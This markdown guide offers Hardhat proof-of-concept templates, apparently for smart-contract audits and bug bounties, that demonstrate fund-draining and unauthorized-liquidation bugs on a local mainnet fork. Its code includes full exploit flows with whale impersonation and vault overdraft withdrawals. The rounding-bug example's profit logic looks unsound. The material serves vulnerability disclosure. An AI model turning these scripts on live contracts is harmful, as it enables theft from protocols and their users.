# Practical Hardhat PoC Template for Vulnerability Demonstration

```
Generate a Hardhat PoC for this vulnerability using Template 1 from POC_TEMPLATE_HARDHAT.md

Vulnerability: Vault.sol withdraw() doesn't check balances
Contract: 0x123...
Exploit: Deposit 100, withdraw 1000
```

## Quick Decision: What Type of Bug?

Before writing code, answer one question:

**Does the attacker extract value (tokens/ETH)?**
- **Yes** → Use **Template 1: Value Extraction** (most common)
- **No** → Use **Template 2: Invariant Break** (unauthorized execution)

---

## Setup: Hardhat Configuration

### `hardhat.config.js`

```javascript
require("@nomicfoundation/hardhat-toolbox");
require("dotenv").config();

module.exports = {
  solidity: {
    version: "0.8.20",
    settings: {
      optimizer: {
        enabled: true,
        runs: 200
      }
    }
  },
  networks: {
    hardhat: {
      forking: {
        url: process.env.MAINNET_RPC_URL,
        blockNumber: 19_500_000,  // Use recent stable block
        enabled: true
      },
      gasPrice: 50000000000,  // 50 gwei
      initialBaseFeePerGas: 1000000000
    }
  },
  mocha: {
    timeout: 600000  // 10 minutes for fork tests
  }
};
```

### `.env`

```bash
MAINNET_RPC_URL=https://eth-mainnet.g.alchemy.com/v2/YOUR_KEY_HERE
```

---

## Template 1: Value Extraction PoC

Use when the attacker steals/drains/mints tokens or ETH.

### Complete Test File

```javascript
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("Exploit: [Vulnerability Name]", function () {
  // ═══════════════════════════════════════════════════════════
  // CONFIGURATION
  // ═══════════════════════════════════════════════════════════
  
  // Mainnet addresses (replace with actual)
  const VULNERABLE_CONTRACT = "0x...";
  const UNDERLYING_TOKEN = "0x...";
  const TOKEN_WHALE = "0x...";  // Find on Etherscan
  
  // Test accounts
  const ATTACKER = "0x0000000000000000000000000000000000001337";
  
  // Economic parameters
  const INITIAL_TOKENS = ethers.parseUnits("10000", 18);
  const FORK_BLOCK = 19_500_000;
  
  // Contract references
  let vulnerable, token;
  let attacker;
  
  // State tracking
  let attackerTokenBefore, vaultTokenBefore;
  
  // ═══════════════════════════════════════════════════════════
  // SETUP
  // ═══════════════════════════════════════════════════════════
  
  before(async function () {
    console.log("\n=== Setting up mainnet fork ===");
    
    // Reset to mainnet fork
    await network.provider.request({
      method: "hardhat_reset",
      params: [{
        forking: {
          jsonRpcUrl: process.env.MAINNET_RPC_URL,
          blockNumber: FORK_BLOCK
        }
      }]
    });
    
    console.log(`Forked at block: ${FORK_BLOCK}`);
    
    // Initialize contracts with minimal ABIs
    const tokenAbi = [
      "function balanceOf(address) view returns (uint256)",
      "function approve(address, uint256) returns (bool)",
      "function transfer(address, uint256) returns (bool)"
    ];
    
    const vulnerableAbi = [
      // Add only functions needed for exploit
      "function deposit(uint256) external",
      "function withdraw(uint256) external",
      "function balanceOf(address) view returns (uint256)"
    ];
    
    token = await ethers.getContractAt(tokenAbi, UNDERLYING_TOKEN);
    vulnerable = await ethers.getContractAt(vulnerableAbi, VULNERABLE_CONTRACT);
    
    // Fund attacker with ETH for gas
    await network.provider.send("hardhat_setBalance", [
      ATTACKER,
      ethers.parseEther("10").toString(16)
    ]);
    
    attacker = await ethers.getImpersonatedSigner(ATTACKER);
    
    // Get initial tokens from whale
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [TOKEN_WHALE]
    });
    
    const whale = await ethers.getSigner(TOKEN_WHALE);
    await token.connect(whale).transfer(ATTACKER, INITIAL_TOKENS);
    
    await network.provider.request({
      method: "hardhat_stopImpersonatingAccount",
      params: [TOKEN_WHALE]
    });
    
    // Record initial balances
    attackerTokenBefore = await token.balanceOf(ATTACKER);
    vaultTokenBefore = await token.balanceOf(VULNERABLE_CONTRACT);
    
    console.log("Attacker balance:", ethers.formatUnits(attackerTokenBefore, 18));
    console.log("Vault balance:", ethers.formatUnits(vaultTokenBefore, 18));
  });
  
  // ═══════════════════════════════════════════════════════════
  // THE EXPLOIT
  // ═══════════════════════════════════════════════════════════
  
  it("exploits vulnerability to drain funds", async function () {
    console.log("\n=== Executing exploit ===");
    
    // Step 1: Approve tokens
    await token.connect(attacker).approve(
      VULNERABLE_CONTRACT,
      ethers.MaxUint256
    );
    
    // Step 2: Deposit to get shares/position
    await vulnerable.connect(attacker).deposit(INITIAL_TOKENS);
    
    // Step 3: Trigger vulnerability
    // Example: Call vulnerable function that allows overdraft
    await vulnerable.connect(attacker).withdraw(
      ethers.parseUnits("20000", 18)  // Withdraw more than deposited
    );
    
    // Verify impact
    const attackerTokenAfter = await token.balanceOf(ATTACKER);
    const vaultTokenAfter = await token.balanceOf(VULNERABLE_CONTRACT);
    
    const profit = attackerTokenAfter - attackerTokenBefore;
    const loss = vaultTokenBefore - vaultTokenAfter;
    
    console.log("\n=== Results ===");
    console.log("Attacker profit:", ethers.formatUnits(profit, 18));
    console.log("Vault loss:", ethers.formatUnits(loss, 18));
    
    // Assertions
    expect(profit).to.be.gt(0, "Attacker should profit");
    expect(loss).to.be.gt(0, "Vault should lose funds");
  });
});
```

### What to Customize

1. **Addresses** - Replace with actual mainnet addresses
2. **ABIs** - Add functions you need for your specific exploit
3. **Exploit steps** - Replace deposit/withdraw with your actual attack
4. **Assertions** - Verify your specific impact

---

## Template 2: Invariant Break PoC

Use when attacker triggers unauthorized execution without direct value extraction.

### Complete Test File

```javascript
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("Invariant Break: [Vulnerability Name]", function () {
  // ═══════════════════════════════════════════════════════════
  // CONFIGURATION
  // ═══════════════════════════════════════════════════════════
  
  const VULNERABLE_CONTRACT = "0x...";
  const ATTACKER = "0x0000000000000000000000000000000000001337";
  const VICTIM = "0x0000000000000000000000000000000000002222";
  const FORK_BLOCK = 19_500_000;
  
  let vulnerable, attacker, victim;
  
  // ═══════════════════════════════════════════════════════════
  // SETUP
  // ═══════════════════════════════════════════════════════════
  
  before(async function () {
    console.log("\n=== Setting up mainnet fork ===");
    
    await network.provider.request({
      method: "hardhat_reset",
      params: [{
        forking: {
          jsonRpcUrl: process.env.MAINNET_RPC_URL,
          blockNumber: FORK_BLOCK
        }
      }]
    });
    
    const vulnerableAbi = [
      "function createPosition() external",
      "function liquidate(address) external",
      "function isSolvent(address) view returns (bool)",
      "function getSolvencyRatio(address) view returns (uint256)"
    ];
    
    vulnerable = await ethers.getContractAt(vulnerableAbi, VULNERABLE_CONTRACT);
    
    // Fund both accounts
    await network.provider.send("hardhat_setBalance", [
      ATTACKER,
      ethers.parseEther("10").toString(16)
    ]);
    await network.provider.send("hardhat_setBalance", [
      VICTIM,
      ethers.parseEther("10").toString(16)
    ]);
    
    attacker = await ethers.getImpersonatedSigner(ATTACKER);
    victim = await ethers.getImpersonatedSigner(VICTIM);
    
    // Setup victim in safe state
    await vulnerable.connect(victim).createPosition();
    
    console.log("Victim solvency:", await vulnerable.isSolvent(VICTIM));
  });
  
  // ═══════════════════════════════════════════════════════════
  // THE EXPLOIT
  // ═══════════════════════════════════════════════════════════
  
  it("liquidates solvent position (breaks invariant)", async function () {
    console.log("\n=== Testing Invariant ===");
    console.log("RULE: Only insolvent positions can be liquidated");
    
    // Verify victim is solvent (should be protected)
    const isSolventBefore = await vulnerable.isSolvent(VICTIM);
    expect(isSolventBefore).to.be.true;
    
    console.log("\n=== Executing unauthorized liquidation ===");
    
    // This should fail but won't due to bug
    await vulnerable.connect(attacker).liquidate(VICTIM);
    
    // Verify invariant was broken
    const wasLiquidated = !(await vulnerable.isSolvent(VICTIM));
    
    console.log("\n=== Results ===");
    console.log("Liquidation executed:", wasLiquidated);
    
    expect(wasLiquidated).to.be.true;
  });
});
```

---

## Common Patterns

### Pattern 1: Impersonate Account

```javascript
// Impersonate any address
await network.provider.request({
  method: "hardhat_impersonateAccount",
  params: [address]
});

const signer = await ethers.getSigner(address);

// Use it
await token.connect(signer).transfer(recipient, amount);

// Stop impersonation
await network.provider.request({
  method: "hardhat_stopImpersonatingAccount",
  params: [address]
});
```

### Pattern 2: Set Balance

```javascript
// Give account ETH
await network.provider.send("hardhat_setBalance", [
  account,
  ethers.parseEther("100").toString(16)  // 100 ETH
]);
```

### Pattern 3: Time Manipulation

```javascript
// Advance time by 1 day
const block = await ethers.provider.getBlock("latest");
await network.provider.send("evm_setNextBlockTimestamp", [
  block.timestamp + 86400
]);
await network.provider.send("evm_mine");
```

### Pattern 4: Gas Tracking

```javascript
const tx = await vulnerable.connect(attacker).exploit();
const receipt = await tx.wait();

console.log("Gas used:", receipt.gasUsed.toString());
console.log("Gas price:", receipt.gasPrice.toString());

const gasCost = receipt.gasUsed * receipt.gasPrice;
console.log("ETH spent:", ethers.formatEther(gasCost));
```

### Pattern 5: Multi-Transaction Attack

```javascript
// Transaction 1
await vulnerable.connect(attacker).setupAttack();

// Mine a block
await network.provider.send("evm_mine");

// Transaction 2
await vulnerable.connect(attacker).executeAttack();

// Mine another block
await network.provider.send("evm_mine");

// Transaction 3
await vulnerable.connect(attacker).extractProfit();
```

---

## Running Your Tests

### Basic Run

```bash
npx hardhat test
```

### Specific Test

```bash
npx hardhat test --grep "exploits vulnerability"
```

### With Console Logs

```bash
npx hardhat test --verbose
```

### With Gas Report

```bash
# Install gas reporter first
npm install --save-dev hardhat-gas-reporter

# Add to hardhat.config.js:
require("hardhat-gas-reporter");

# Then run
npx hardhat test
```

---

## Rules for Realistic PoCs

### ✅ DO:

1. **Fork mainnet** - Use real deployed contracts
2. **Use impersonateAccount** - For whale tokens or testing different roles
3. **Minimal ABIs** - Only include functions you actually call
4. **Show the numbers** - Log balances before/after
5. **Realistic gas** - Use 50+ gwei gas price

### ❌ DON'T:

1. **Don't use `hardhat_setStorageAt` on target** - Can't modify deployed contract storage
2. **Don't mock in-scope contracts** - Test the real thing
3. **Don't use unrealistic amounts** - Keep values reasonable
4. **Don't skip setup steps** - Show the full attack path

### Special Case: When `hardhat_setStorageAt` Is OK

Only to model **historical state** that could have existed:

```javascript
// ✅ ACCEPTABLE: Simulating old checkpoint that wasn't revalidated
const oldCheckpoint = Math.floor(Date.now() / 1000) - (30 * 24 * 60 * 60); // 30 days ago

// Get storage slot for checkpoint
const slot = ethers.solidityPackedKeccak256(
  ["uint256", "uint256"],
  [5, 0]  // slot 5 in storage
);

await network.provider.send("hardhat_setStorageAt", [
  VULNERABLE_CONTRACT,
  slot,
  ethers.zeroPadValue(ethers.toBeHex(oldCheckpoint), 32)
]);

// Now show the bug: protocol doesn't revalidate
await vulnerable.connect(attacker).useCheckpoint();
```

---

## Complete Example: Rounding Bug Exploit

```javascript
const { expect } = require("chai");
const { ethers, network } = require("hardhat");

describe("Rounding Exploit in Vault", function () {
  const VAULT = "0x123...";  // Real vault address
  const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  const WHALE = "0xabc...";  // Top USDC holder
  const ATTACKER = "0x1337...";
  
  let vault, usdc, attacker;
  
  before(async function () {
    // Fork mainnet
    await network.provider.request({
      method: "hardhat_reset",
      params: [{
        forking: {
          jsonRpcUrl: process.env.MAINNET_RPC_URL,
          blockNumber: 19_500_000
        }
      }]
    });
    
    // Get contracts
    vault = await ethers.getContractAt([
      "function deposit(uint256, address) returns (uint256)",
      "function withdraw(uint256, address, address) returns (uint256)",
      "function maxWithdraw(address) view returns (uint256)"
    ], VAULT);
    
    usdc = await ethers.getContractAt([
      "function balanceOf(address) view returns (uint256)",
      "function approve(address, uint256) returns (bool)",
      "function transfer(address, uint256) returns (bool)"
    ], USDC);
    
    // Setup attacker
    await network.provider.send("hardhat_setBalance", [
      ATTACKER,
      ethers.parseEther("10").toString(16)
    ]);
    
    attacker = await ethers.getImpersonatedSigner(ATTACKER);
    
    // Get USDC from whale
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [WHALE]
    });
    
    const whale = await ethers.getSigner(WHALE);
    const amount = ethers.parseUnits("1000000", 6);  // $1M USDC
    await usdc.connect(whale).transfer(ATTACKER, amount);
    
    await network.provider.request({
      method: "hardhat_stopImpersonatingAccount",
      params: [WHALE]
    });
  });
  
  it("exploits rounding error to profit", async function () {
    const vaultBefore = await usdc.balanceOf(VAULT);
    
    console.log("Vault balance:", ethers.formatUnits(vaultBefore, 6), "USDC");
    
    // Exploit: Large deposit then withdraw with rounding in attacker's favor
    const depositAmount = ethers.parseUnits("1000000", 6);
    
    await usdc.connect(attacker).approve(VAULT, ethers.MaxUint256);
    await vault.connect(attacker).deposit(depositAmount, ATTACKER);
    
    // Withdraw 1 wei less to trigger rounding bug
    const maxWithdraw = await vault.maxWithdraw(ATTACKER);
    await vault.connect(attacker).withdraw(maxWithdraw - 1n, ATTACKER, ATTACKER);
    
    const vaultAfter = await usdc.balanceOf(VAULT);
    const attackerProfit = await usdc.balanceOf(ATTACKER);
    
    console.log("Vault balance:", ethers.formatUnits(vaultAfter, 6), "USDC");
    console.log("Attacker profit:", ethers.formatUnits(attackerProfit - depositAmount, 6), "USDC");
    
    expect(vaultAfter).to.be.lt(vaultBefore);
    expect(attackerProfit).to.be.gt(depositAmount);
  });
});
```

---

## Summary

**For most bugs:** Use **Template 1 (Value Extraction)**  
**For access control/invariant bugs:** Use **Template 2 (Invariant Break)**

**Keep it simple:**
1. Fork mainnet
2. Setup attacker with `impersonateAccount`
3. Execute the exploit
4. Verify with assertions

**The PoC should answer:** "Can an attacker with no special privileges exploit this on mainnet?"

If yes, you've written a good PoC.
